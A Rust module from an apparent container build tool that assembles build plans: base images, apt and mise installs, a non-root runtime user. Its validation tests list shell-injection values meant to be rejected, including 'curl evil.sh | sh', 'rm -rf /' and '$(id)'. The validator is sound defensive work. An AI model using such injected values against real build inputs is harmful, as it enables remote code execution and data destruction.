//! Plan generation context handed to providers.
//!
//! Providers mutate a [`BuildContext`] instead of assembling a [`BuildPlan`]
//! directly. The context owns the parts every build shares — the mise runtime
//! layer, apt packages, caches, the runtime image — so a provider only has to
//! describe what is specific to its ecosystem.

use indexmap::IndexMap;

use crate::app::App;
use crate::config::Config;
use crate::env::Environment;
use crate::error::Error;
use crate::error::Result;
use crate::lock::Lock;
use crate::mise::{self, MisePackages};
use crate::plan::{BuildPlan, Cache, Command, Filter, Layer, RuntimeUser, Step};
use crate::steps;

/// Working directory used for application source inside every step.
pub const APP_DIR: &str = "/app";

/// Base image used for the builder and runtime images unless overridden.
pub const DEFAULT_BASE_IMAGE: &str = "debian:bookworm-slim";

/// Packages installed in every builder image, needed to bootstrap mise.
const BOOTSTRAP_APT_PACKAGES: &[&str] = &["ca-certificates", "curl", "git"];

/// Packages installed in every runtime image.
///
/// `tini` is not optional. Without an init, the application ends up as PID 1,
/// where the kernel discards any signal whose disposition is still the default
/// — so `SIGTERM` does nothing and every stop waits out the full grace period
/// before a `SIGKILL`. That turns each deploy into a hard kill of in-flight
/// requests.
const RUNTIME_APT_PACKAGES: &[&str] = &["ca-certificates", "tini"];

/// Name, uid and home of the unprivileged account added to runtime images.
///
/// A high, fixed uid avoids colliding with accounts the base image already
/// defines (Debian allocates system users from 100 and normal users from 1000),
/// and keeps the value stable so a volume chowned by one build is still
/// writable by the next.
pub const DEFAULT_RUNTIME_USER: &str = "autopack";
/// Numeric id used for the runtime account.
pub const DEFAULT_RUNTIME_UID: u32 = 10001;

/// Paths never uploaded into the build context.
const DEFAULT_EXCLUDES: &[&str] = &[
    ".git",
    ".gitignore",
    ".dockerignore",
    "Dockerfile",
    ".venv",
    "__pycache__",
    ".pytest_cache",
    ".mypy_cache",
];

/// Mutable state a provider fills in while planning a build.
pub struct BuildContext<'a> {
    /// The source directory under analysis.
    pub app: &'a App,
    /// Build-time environment.
    pub env: &'a Environment,
    /// User configuration, applied to the finished plan by [`BuildContext::generate`].
    pub config: &'a Config,
    /// Language runtimes to install with mise.
    pub packages: MisePackages,
    /// Extra Debian packages for the builder image.
    pub build_apt_packages: Vec<String>,
    /// Extra Debian packages for the runtime image.
    pub deploy_apt_packages: Vec<String>,
    /// Free-form facts surfaced by `autopack info` (detected framework, package manager, ...).
    pub metadata: IndexMap<String, String>,

    base_image: String,
    custom_base_image: bool,
    runtime_user: Option<RuntimeUser>,
    lock: Option<Lock>,
    runtime_base_image: Option<String>,
    runtime_includes_runtimes: bool,
    start_command: Option<String>,
    steps: IndexMap<String, Step>,
    caches: IndexMap<String, Cache>,
    deploy_inputs: Vec<Layer>,
    runtime_inputs: Vec<Layer>,
    runtime_commands: Vec<Command>,
    deploy_variables: IndexMap<String, String>,
    deploy_paths: Vec<String>,
    tasks: IndexMap<String, String>,
}

impl<'a> BuildContext<'a> {
    /// Create a context for `app`.
    pub fn new(app: &'a App, env: &'a Environment, config: &'a Config) -> Self {
        let base_image = env
            .config("BASE_IMAGE")
            .unwrap_or(DEFAULT_BASE_IMAGE)
            .to_string();

        Self {
            app,
            env,
            config,
            packages: MisePackages::new(),
            build_apt_packages: Vec::new(),
            deploy_apt_packages: Vec::new(),
            metadata: IndexMap::new(),
            base_image,
            custom_base_image: false,
            runtime_user: default_runtime_user(env),
            lock: None,
            runtime_base_image: env.config("RUNTIME_BASE_IMAGE").map(str::to_string),
            runtime_includes_runtimes: true,
            start_command: None,
            steps: IndexMap::new(),
            caches: IndexMap::new(),
            deploy_inputs: Vec::new(),
            runtime_inputs: Vec::new(),
            runtime_commands: Vec::new(),
            deploy_variables: IndexMap::new(),
            deploy_paths: Vec::new(),
            tasks: IndexMap::new(),
        }
    }

    /// The image build stages start from.
    pub fn base_image(&self) -> &str {
        &self.base_image
    }

    /// Build on a different base image.
    ///
    /// Providers for ecosystems whose toolchain is impractical to install at
    /// build time — Ruby compiles from source under mise, PHP needs its
    /// extensions prebuilt — start from an official language image instead.
    /// `AUTOPACK_BASE_IMAGE` still wins, so a user can always override.
    /// The base image must be Debian- or Ubuntu-based: autopack installs system
    /// packages with apt.
    pub fn set_base_image(&mut self, image: impl Into<String>) {
        self.custom_base_image = true;
        if self.env.config("BASE_IMAGE").is_none() {
            self.base_image = image.into();
        }
    }

    /// The image the runtime stage starts from.
    pub fn runtime_base_image(&self) -> &str {
        self.runtime_base_image
            .as_deref()
            .unwrap_or(&self.base_image)
    }

    /// Use a different, usually smaller, image for the runtime stage.
    ///
    /// A .NET app builds against the SDK image but only needs the ASP.NET
    /// runtime image to run; shipping the SDK would triple the image size.
    pub fn set_runtime_base_image(&mut self, image: impl Into<String>) {
        if self.env.config("RUNTIME_BASE_IMAGE").is_none() {
            self.runtime_base_image = Some(image.into());
        }
    }

    /// Get or create a step by name.
    ///
    /// New steps start with the mise runtime layer as their base and the app
    /// source overlaid, which is what nearly every provider wants; override
    /// `inputs` for steps that need something else.
    pub fn step(&mut self, name: impl Into<String>) -> &mut Step {
        let name = name.into();
        self.steps.entry(name.clone()).or_insert_with(|| {
            let mut step = Step::new(name);
            step.add_input(Layer::step(steps::PACKAGES));
            step
        })
    }

    /// True when `name` has already been created.
    pub fn has_step(&self, name: &str) -> bool {
        self.steps.contains_key(name)
    }

    /// Names of the steps created so far, in creation order.
    pub fn step_names(&self) -> Vec<&str> {
        self.steps.keys().map(String::as_str).collect()
    }

    /// Register a cache and return its name for [`Step::add_cache`].
    pub fn add_cache(&mut self, name: impl Into<String>, cache: Cache) -> String {
        let name = name.into();
        self.caches.insert(name.clone(), cache);
        name
    }

    /// Register a shared cache over `directory`.
    pub fn shared_cache(
        &mut self,
        name: impl Into<String>,
        directory: impl Into<String>,
    ) -> String {
        self.add_cache(name, Cache::shared(directory))
    }

    /// Register a locked cache over `directory`.
    pub fn locked_cache(
        &mut self,
        name: impl Into<String>,
        directory: impl Into<String>,
    ) -> String {
        self.add_cache(name, Cache::locked(directory))
    }

    /// Pin resolved versions and image digests from a lock file.
    pub fn set_lock(&mut self, lock: Lock) {
        self.lock = Some(lock);
    }

    /// The lock in effect, if the app has one.
    pub fn lock(&self) -> Option<&Lock> {
        self.lock.as_ref()
    }

    /// Apply the lock's digest to an image reference.
    fn pinned(&self, image: &str) -> String {
        match &self.lock {
            Some(lock) => lock.pin_image(image),
            None => image.to_string(),
        }
    }

    /// The account the container will run as, or `None` for root.
    pub fn runtime_user(&self) -> Option<&RuntimeUser> {
        self.runtime_user.as_ref()
    }

    /// Run the container as root.
    ///
    /// Only for images that genuinely cannot work unprivileged — binding a
    /// port below 1024, or a base image whose entrypoint expects root.
    pub fn set_runtime_user_root(&mut self) {
        self.runtime_user = None;
    }

    /// Whether the runtime image carries the mise runtimes.
    ///
    /// Compiled languages that produce a self-contained binary should turn this
    /// off: shipping a Go toolchain in the runtime image costs hundreds of
    /// megabytes and buys nothing.
    pub fn set_runtime_includes_runtimes(&mut self, included: bool) {
        self.runtime_includes_runtimes = included;
    }

    /// Whether the runtime image will carry the installed runtimes.
    ///
    /// A provider that adds a runtime package for a mise-installed binary has
    /// to ask: a static site drops `/mise` entirely, so a library that only
    /// exists for one of those binaries is dead weight there.
    pub fn runtime_includes_runtimes(&self) -> bool {
        self.runtime_includes_runtimes
    }

    /// Set the command the container runs.
    pub fn set_start_command(&mut self, command: impl Into<String>) {
        self.start_command = Some(command.into());
    }

    /// The start command set so far.
    pub fn start_command(&self) -> Option<&str> {
        self.start_command.as_deref()
    }

    /// Copy a layer into the runtime *stage*, before its commands run.
    ///
    /// Distinct from [`BuildContext::add_deploy_input`], which copies into the
    /// final image after every command. Use this when a runtime command needs
    /// to inspect what was copied.
    pub fn add_runtime_input(&mut self, layer: Layer) {
        self.runtime_inputs.push(layer);
    }

    /// Run a command while building the runtime image.
    pub fn add_runtime_command(&mut self, command: Command) {
        self.runtime_commands.push(command);
    }

    /// Copy a layer into the runtime image.
    pub fn add_deploy_input(&mut self, layer: Layer) {
        self.deploy_inputs.push(layer);
    }

    /// Set an environment variable on the runtime image.
    pub fn add_deploy_variable(&mut self, key: impl Into<String>, value: impl Into<String>) {
        self.deploy_variables.insert(key.into(), value.into());
    }

    /// Prepend a directory to the runtime `PATH`.
    pub fn add_deploy_path(&mut self, path: impl Into<String>) {
        let path = path.into();
        if !self.deploy_paths.contains(&path) {
            self.deploy_paths.push(path);
        }
    }

    /// Register a task the platform can run against the built image.
    pub fn add_task(&mut self, name: impl Into<String>, command: impl Into<String>) {
        self.tasks.insert(name.into(), command.into());
    }

    /// Record a fact for `autopack info`.
    pub fn add_metadata(&mut self, key: impl Into<String>, value: impl Into<String>) {
        self.metadata.insert(key.into(), value.into());
    }

    /// Assemble the final plan: runtime layer, provider steps, runtime image,
    /// user configuration, normalization, and validation.
    pub fn generate(&mut self) -> Result<BuildPlan> {
        // User-configured runtimes override anything a provider inferred.
        let configured: Vec<(String, String)> = self
            .config
            .packages
            .iter()
            .map(|(tool, version)| (tool.clone(), version.clone()))
            .collect();
        for (tool, version) in configured {
            self.packages.add(tool, version, "autopack.json");
        }
        let apt_packages = self.config.apt_packages.clone();
        self.build_apt_packages.extend(apt_packages);
        let deploy_apt_packages = self.config.deploy_apt_packages.clone();
        self.deploy_apt_packages.extend(deploy_apt_packages);

        // Official language images vary wildly in what they ship. The Gleam
        // image, for one, has an empty /etc/ssl/certs, so every dependency
        // fetch fails TLS verification with an error that names neither TLS
        // nor certificates. Guaranteeing the trust store on any non-default
        // base removes a whole class of "works on image A, not on image B".
        if self.custom_base_image {
            self.build_apt_packages.push("ca-certificates".to_string());
        }

        // Both lists end up joined into a shell command that runs as root.
        check_apt_packages(&self.build_apt_packages)?;
        check_apt_packages(&self.deploy_apt_packages)?;

        let mut plan = BuildPlan::new();
        plan.caches = self.caches.clone();

        let needs_packages_step = !self.packages.is_empty() || !self.build_apt_packages.is_empty();
        if needs_packages_step {
            let step = self.build_packages_step();
            plan.add_step(step);
        }

        for step in self.steps.values() {
            let mut step = step.clone();
            if !needs_packages_step {
                // Nothing to install: collapse the runtime layer away rather
                // than leaving a dangling reference. The first input is the
                // stage's base, so it has to remain an image or another step.
                step.inputs
                    .retain(|input| input.step.as_deref() != Some(steps::PACKAGES));
                let has_base = step
                    .inputs
                    .first()
                    .is_some_and(|input| input.image.is_some() || input.step.is_some());
                if !has_base {
                    step.inputs
                        .insert(0, Layer::image(self.pinned(&self.base_image)));
                }
            }
            plan.add_step(step);
        }

        // Keyed on mise runtimes, not on the packages step: a provider that
        // only asked for apt packages has a packages step but no `/mise`, and
        // copying a directory that was never created fails the build.
        let runtime_has_packages = !self.packages.is_empty() && self.runtime_includes_runtimes;
        plan.add_step(self.build_runtime_step(runtime_has_packages));

        plan.deploy.base = Layer::step(steps::RUNTIME);
        plan.deploy.inputs = if self.deploy_inputs.is_empty() {
            self.default_deploy_inputs()
        } else {
            self.deploy_inputs.clone()
        };
        plan.deploy.start_command = self.start_command.clone();
        plan.deploy.user = self.runtime_user.clone();
        plan.deploy.tasks = self.tasks.clone();
        plan.deploy.variables = self.deploy_variables.clone();
        plan.deploy.paths = self.deploy_paths.clone();
        if runtime_has_packages {
            plan.deploy.add_path(mise::MISE_SHIMS);
        }

        plan.secrets = self.env.secrets().to_vec();
        plan.exclude = DEFAULT_EXCLUDES.iter().map(|s| s.to_string()).collect();

        self.config.apply(&mut plan);
        plan.normalize();
        plan.validate()?;

        // Checked after config so a user-supplied start command rescues an app
        // the provider could not classify.
        if plan.deploy.start_command.is_none() {
            return Err(crate::error::Error::MissingStartCommand);
        }

        Ok(plan)
    }

    /// The step that installs system packages and every requested language runtime.
    ///
    /// mise is only bootstrapped when a runtime was actually requested: a
    /// provider that builds on an official language image (Ruby, PHP, .NET)
    /// still wants apt packages, but has nothing for mise to install.
    fn build_packages_step(&self) -> Step {
        let mut step = Step::new(steps::PACKAGES);
        step.add_input(Layer::image(self.pinned(&self.base_image)));
        step.add_variable("DEBIAN_FRONTEND", "noninteractive");

        // Secrets are irrelevant here and would only add cache churn.
        step.secrets.clear();

        let mut apt_packages: Vec<String> = BOOTSTRAP_APT_PACKAGES
            .iter()
            .map(|p| p.to_string())
            .collect();
        for package in &self.build_apt_packages {
            if !apt_packages.contains(package) {
                apt_packages.push(package.clone());
            }
        }
        step.add_command(Command::shell(apt_install(&apt_packages)));

        if self.packages.is_empty() {
            return step;
        }

        step.add_variable("MISE_DATA_DIR", mise::MISE_DIR)
            .add_variable("MISE_CONFIG_DIR", mise::MISE_DIR)
            .add_variable("MISE_STATE_DIR", mise::MISE_DIR)
            .add_variable("MISE_CACHE_DIR", format!("{}/cache", mise::MISE_DIR))
            .add_variable("MISE_INSTALL_PATH", "/usr/local/bin/mise")
            .add_variable("MISE_YES", "1");

        let mise_version = self
            .env
            .config("MISE_VERSION")
            .unwrap_or(mise::DEFAULT_MISE_VERSION);
        step.add_command(Command::shell(format!(
            "curl -fsSL https://mise.run | MISE_VERSION={mise_version} sh"
        )));

        // Exact versions from the lock replace the fuzzy specification, so
        // `node = "22"` becomes `node = "22.14.0"` and stops drifting.
        let mut pinned = self.packages.clone();
        if let Some(lock) = &self.lock {
            for (tool, version) in &lock.tools {
                if pinned.iter().any(|(name, _)| name == tool) {
                    pinned.add(tool, version, "autopack.lock");
                }
            }
        }
        let asset = step.add_asset("mise.toml", pinned.to_toml());
        step.add_command(Command::file(
            format!("{}/config.toml", mise::MISE_DIR),
            asset,
        ));
        step.add_command(Command::shell("mise install && mise reshim"));
        step.add_command(Command::path(mise::MISE_SHIMS));
        step
    }

    /// The runtime image: base plus the installed runtimes, without build tools.
    fn build_runtime_step(&self, has_packages: bool) -> Step {
        let mut step = Step::new(steps::RUNTIME);
        step.add_input(Layer::image(self.pinned(self.runtime_base_image())));
        step.secrets.clear();

        let mut apt_packages: Vec<String> =
            RUNTIME_APT_PACKAGES.iter().map(|p| p.to_string()).collect();
        for package in &self.deploy_apt_packages {
            if !apt_packages.contains(package) {
                apt_packages.push(package.clone());
            }
        }
        step.add_variable("DEBIAN_FRONTEND", "noninteractive");
        step.add_command(Command::shell(apt_install(&apt_packages)));

        if let Some(user) = &self.runtime_user {
            // `--no-log-init` avoids useradd allocating a sparse lastlog file
            // sized by uid, which at uid 10001 is harmless but at higher ids
            // has produced multi-gigabyte layers.
            step.add_command(Command::shell(format!(
                "groupadd --gid {gid} {name} && \
                 useradd --uid {uid} --gid {gid} --no-log-init \
                 --create-home --home-dir {home} --shell /usr/sbin/nologin {name}",
                gid = user.gid,
                uid = user.uid,
                name = user.name,
                home = user.home,
            )));
        }

        for input in &self.runtime_inputs {
            step.add_input(input.clone());
        }

        if has_packages {
            step.add_input(
                Layer::step(steps::PACKAGES).including([mise::MISE_DIR, "/usr/local/bin/mise"]),
            );
            step.add_variable("MISE_DATA_DIR", mise::MISE_DIR)
                .add_variable("MISE_CONFIG_DIR", mise::MISE_DIR)
                .add_variable("MISE_STATE_DIR", mise::MISE_DIR);
            step.add_command(Command::path(mise::MISE_SHIMS));
        }

        for command in &self.runtime_commands {
            step.add_command(command.clone());
        }

        step
    }

    /// Copy the app directory out of the last provider step by default.
    fn default_deploy_inputs(&self) -> Vec<Layer> {
        let Some(last) = self.steps.keys().next_back() else {
            return Vec::new();
        };
        vec![Layer::step(last).with_filter(Filter::include([APP_DIR]))]
    }
}

/// A single cache-friendly apt invocation.
///
/// `apt-get update` and `install` must share one command: splitting them lets
/// Docker reuse a stale package index and install versions that no longer exist.
fn apt_install(packages: &[String]) -> String {
    format!(
        "apt-get update && apt-get install -y --no-install-recommends {} && rm -rf /var/lib/apt/lists/*",
        packages.join(" ")
    )
}

/// Whether `name` is a legal Debian package name.
///
/// Policy from Debian: lowercase alphanumerics plus `+`, `-`, `.`, at least
/// two characters, starting alphanumeric. An architecture qualifier (`:any`)
/// and a version pin (`=1.2.3`) are both accepted because `apt-get install`
/// takes them.
///
/// This matters because the list is joined with spaces into a shell command
/// (see `apt_install`) that runs as root. Nothing in the built-in tables can
/// produce a bad name, but `apt_packages` in `autopack.json` — and the
/// `railpack.json` / `nixpacks.toml` compatibility readers, which are honoured
/// by default — come from the app directory. Rejecting is right rather than
/// quoting: a name that needs quoting is not a package name, and a clear error
/// beats an apt failure the user has to decode.
fn is_valid_apt_package(name: &str) -> bool {
    let name = name.split_once('=').map_or(name, |(name, _)| name);
    let name = name.split_once(':').map_or(name, |(name, _)| name);

    name.len() >= 2
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
        && name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '-' | '.'))
}

/// Reject any apt package name that is not one, before it reaches a shell.
fn check_apt_packages(packages: &[String]) -> Result<()> {
    for package in packages {
        if !is_valid_apt_package(package) {
            return Err(Error::Provider {
                provider: "apt".to_string(),
                message: format!(
                    "`{package}` is not a valid Debian package name. \
                     Package names are lowercase alphanumerics with `+`, `-` and `.`, \
                     optionally followed by `:arch` or `=version`."
                ),
            });
        }
    }
    Ok(())
}

/// The runtime account to create, honouring `AUTOPACK_USER`.
///
/// Non-root is the default. Container escapes and volume-mount mistakes are
/// both much cheaper when the process has no privileges, and "root by default"
/// is the finding every image scanner reports first. `AUTOPACK_USER=root` opts
/// out for images that genuinely need it.
fn default_runtime_user(env: &Environment) -> Option<RuntimeUser> {
    let name = env.config("USER").unwrap_or(DEFAULT_RUNTIME_USER);
    if name.eq_ignore_ascii_case("root") || name == "0" {
        return None;
    }
    Some(RuntimeUser {
        name: name.to_string(),
        uid: DEFAULT_RUNTIME_UID,
        gid: DEFAULT_RUNTIME_UID,
        home: format!("/home/{name}"),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn app_fixture() -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("main.go"), "package main").unwrap();
        dir
    }

    #[test]
    fn apt_package_names_are_validated_before_they_reach_a_shell() {
        // apt_install joins these with spaces into a RUN that executes as
        // root, and the list is reachable from autopack.json — plus the
        // railpack/nixpacks compatibility readers, which are on by default.
        for bad in [
            "libpq5; curl evil.sh | sh",
            "libpq5 && rm -rf /",
            "$(id)",
            "`id`",
            "lib pq5",
            "LIBPQ5",
            "-flag",
            "a",
        ] {
            assert!(!is_valid_apt_package(bad), "{bad} should be rejected");
        }

        for good in [
            "libpq5",
            "ca-certificates",
            "libatk1.0-0",
            "g++",
            "libstdc++6",
            "libc6:arm64",
            "curl=7.88.1-10",
        ] {
            assert!(is_valid_apt_package(good), "{good} should be accepted");
        }

        let err = check_apt_packages(&["libpq5; id".to_string()]).unwrap_err();
        assert!(err.to_string().contains("not a valid Debian package name"));
        assert!(check_apt_packages(&["libpq5".to_string()]).is_ok());
    }

    #[test]
    fn generates_packages_and_runtime_steps() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::new();
        let config = Config::default();

        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.packages.add("go", "1.23", "go.mod");
        ctx.step(steps::BUILD)
            .add_command(Command::shell("go build"));
        ctx.set_start_command("./server");

        let plan = ctx.generate().unwrap();

        assert!(plan.step(steps::PACKAGES).is_some());
        assert!(plan.step(steps::RUNTIME).is_some());
        assert_eq!(plan.deploy.base, Layer::step(steps::RUNTIME));
        assert_eq!(plan.deploy.start_command.as_deref(), Some("./server"));
        assert!(plan.deploy.paths.contains(&mise::MISE_SHIMS.to_string()));
    }

    #[test]
    fn skips_the_runtime_layer_when_nothing_needs_installing() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::new();
        let config = Config::default();

        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.step(steps::BUILD).add_command(Command::shell("true"));
        ctx.set_start_command("./app");
        let plan = ctx.generate().unwrap();

        assert!(plan.step(steps::PACKAGES).is_none());
        let build = plan.step(steps::BUILD).unwrap();
        assert_eq!(build.inputs[0].image.as_deref(), Some(DEFAULT_BASE_IMAGE));
        plan.validate().unwrap();
    }

    #[test]
    fn config_packages_override_provider_versions() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::new();
        let mut config = Config::default();
        config.packages.insert("go".into(), "1.21".into());

        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.packages.add("go", "1.23", "go.mod");
        ctx.step(steps::BUILD)
            .add_command(Command::shell("go build"));
        ctx.set_start_command("./server");

        let plan = ctx.generate().unwrap();
        let packages = plan.step(steps::PACKAGES).unwrap();
        assert_eq!(packages.assets["mise.toml"], "[tools]\ngo = \"1.21\"\n");
    }

    #[test]
    fn apt_only_builds_do_not_copy_a_mise_directory() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::new();
        let config = Config::default();

        // A provider that builds on an official language image wants system
        // packages but installs no mise runtimes.
        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.build_apt_packages.push("build-essential".into());
        ctx.step(steps::BUILD).add_command(Command::shell("make"));
        ctx.set_start_command("./app");

        let plan = ctx.generate().unwrap();
        let runtime = plan.step(steps::RUNTIME).unwrap();

        assert!(plan.step(steps::PACKAGES).is_some());
        assert!(
            !runtime.inputs.iter().any(|input| input
                .filter
                .include
                .iter()
                .any(|path| path.contains("mise"))),
            "runtime should not copy /mise: {:?}",
            runtime.inputs
        );
        assert!(plan.deploy.paths.is_empty());
    }

    #[test]
    fn a_custom_base_image_always_gets_a_trust_store() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::new();
        let config = Config::default();

        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.set_base_image("ghcr.io/example/toolchain:1");
        ctx.step(steps::BUILD).add_command(Command::shell("build"));
        ctx.set_start_command("./app");

        let plan = ctx.generate().unwrap();
        let packages = plan.step(steps::PACKAGES).expect("a packages step");
        assert!(packages.commands[0]
            .display_name()
            .contains("ca-certificates"));
    }

    #[test]
    fn base_image_is_configurable() {
        let dir = app_fixture();
        let app = App::new(dir.path()).unwrap();
        let env = Environment::from_pairs([("AUTOPACK_BASE_IMAGE", "ubuntu:24.04")]);
        let config = Config::default();

        let mut ctx = BuildContext::new(&app, &env, &config);
        ctx.packages.add("go", "1.23", "go.mod");
        ctx.step(steps::BUILD)
            .add_command(Command::shell("go build"));
        ctx.set_start_command("./server");

        let plan = ctx.generate().unwrap();
        assert_eq!(
            plan.step(steps::PACKAGES).unwrap().inputs[0]
                .image
                .as_deref(),
            Some("ubuntu:24.04")
        );
    }
}
